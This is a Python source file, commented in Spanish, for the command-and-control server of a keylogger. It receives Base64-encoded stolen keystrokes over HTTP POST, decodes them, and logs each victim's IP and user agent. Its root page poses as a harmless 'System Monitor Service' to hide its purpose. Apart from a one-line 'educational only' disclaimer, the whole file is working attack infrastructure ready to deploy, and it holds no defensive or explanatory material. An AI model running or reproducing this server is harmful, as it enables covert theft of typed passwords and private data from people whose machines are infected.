#!/usr/bin/env python3
"""
C2 Server - Servidor de Comando y Control para Keylogger Educativo
===================================================================

AVISO LEGAL Y ÉTICO:
Este servidor es EXCLUSIVAMENTE para propósitos educativos.
Solo usar en entornos controlados y con autorización explícita.

Funcionalidad:
- Recibe datos exfiltrados via HTTP POST
- Decodifica Base64
- Guarda los datos en archivo de log
- Muestra en consola en tiempo real

Uso:
    python3 c2_server.py [puerto]
    
Ejemplo:
    python3 c2_server.py 8080
"""

import http.server
import socketserver
import base64
import datetime
import os
import sys
import urllib.parse
from pathlib import Path

# Configuración por defecto
DEFAULT_PORT = 8080
LOG_FILE = "exfiltrated_data.log"
UPLOAD_PATH = "/upload"

# Colores para terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def log_message(msg, color=Colors.RESET):
    """Imprime mensaje con timestamp y color."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{color}[{timestamp}] {msg}{Colors.RESET}")

class C2Handler(http.server.BaseHTTPRequestHandler):
    """Handler para peticiones HTTP del keylogger."""
    
    # Silenciar logs de cada petición HTTP
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        """Responde a peticiones GET (para verificar que el servidor está activo)."""
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            response = b"""
            <html>
            <head><title>System Monitor</title></head>
            <body>
            <h1>System Monitor Service</h1>
            <p>Service is running.</p>
            </body>
            </html>
            """
            self.wfile.write(response)
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Recibe y procesa datos exfiltrados."""
        if self.path == UPLOAD_PATH:
            try:
                # Obtener longitud del contenido
                content_length = int(self.headers.get('Content-Length', 0))
                
                # Leer datos POST
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                # Parsear datos (formato: data=BASE64_ENCODED_DATA)
                parsed = urllib.parse.parse_qs(post_data)
                
                if 'data' in parsed:
                    encoded_data = parsed['data'][0]
                    
                    # Decodificar Base64
                    try:
                        decoded_data = base64.b64decode(encoded_data).decode('utf-8')
                        
                        # Obtener info del cliente
                        client_ip = self.client_address[0]
                        user_agent = self.headers.get('User-Agent', 'Unknown')
                        
                        # Mostrar en consola
                        log_message(f"Datos recibidos de {client_ip}", Colors.GREEN)
                        print(f"{Colors.CYAN}--- INICIO DATOS ---{Colors.RESET}")
                        print(decoded_data)
                        print(f"{Colors.CYAN}--- FIN DATOS ---{Colors.RESET}")
                        print()
                        
                        # Guardar en archivo
                        self.save_to_file(decoded_data, client_ip, user_agent)
                        
                        # Responder éxito
                        self.send_response(200)
                        self.send_header("Content-type", "text/plain")
                        self.end_headers()
                        self.wfile.write(b"OK")
                        
                    except Exception as e:
                        log_message(f"Error decodificando Base64: {e}", Colors.RED)
                        self.send_response(400)
                        self.end_headers()
                else:
                    log_message("POST sin campo 'data'", Colors.YELLOW)
                    self.send_response(400)
                    self.end_headers()
                    
            except Exception as e:
                log_message(f"Error procesando POST: {e}", Colors.RED)
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def save_to_file(self, data, client_ip, user_agent):
        """Guarda los datos exfiltrados en archivo."""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"Client IP: {client_ip}\n")
            f.write(f"User-Agent: {user_agent}\n")
            f.write(f"{'='*60}\n")
            f.write(data)
            f.write("\n")

def print_banner():
    """Muestra banner del servidor."""
    banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════╗
║     {Colors.BOLD}C2 SERVER - SOLO USO EDUCATIVO{Colors.RED}                       ║
╚═══════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)

def main():
    """Función principal del servidor C2."""
    # Obtener puerto de argumentos o usar default
    port = DEFAULT_PORT
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print(f"Puerto inválido: {sys.argv[1]}")
            sys.exit(1)
    
    print_banner()
    
    # Mostrar información
    log_message(f"Iniciando servidor C2...", Colors.BLUE)
    log_message(f"Puerto: {port}", Colors.CYAN)
    log_message(f"Endpoint: {UPLOAD_PATH}", Colors.CYAN)
    log_message(f"Log file: {LOG_FILE}", Colors.CYAN)
    print()
    
    # Obtener IP local para mostrar
    import socket
    hostname = socket.gethostname()
    try:
        local_ip = socket.gethostbyname(hostname)
    except:
        local_ip = "127.0.0.1"
    
    log_message(f"Servidor escuchando en:", Colors.GREEN)
    print(f"  {Colors.BOLD}http://{local_ip}:{port}{UPLOAD_PATH}{Colors.RESET}")
    print(f"  {Colors.BOLD}http://0.0.0.0:{port}{UPLOAD_PATH}{Colors.RESET}")
    print()
    log_message("Esperando conexiones... (Ctrl+C para detener)", Colors.YELLOW)
    print()
    
    # Configurar y arrancar servidor
    try:
        with socketserver.TCPServer(("0.0.0.0", port), C2Handler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print()
        log_message("Servidor detenido.", Colors.RED)
    except OSError as e:
        if e.errno == 98:  # Address already in use
            log_message(f"Error: Puerto {port} ya está en uso.", Colors.RED)
        else:
            log_message(f"Error: {e}", Colors.RED)
        sys.exit(1)

if __name__ == "__main__":
    main()

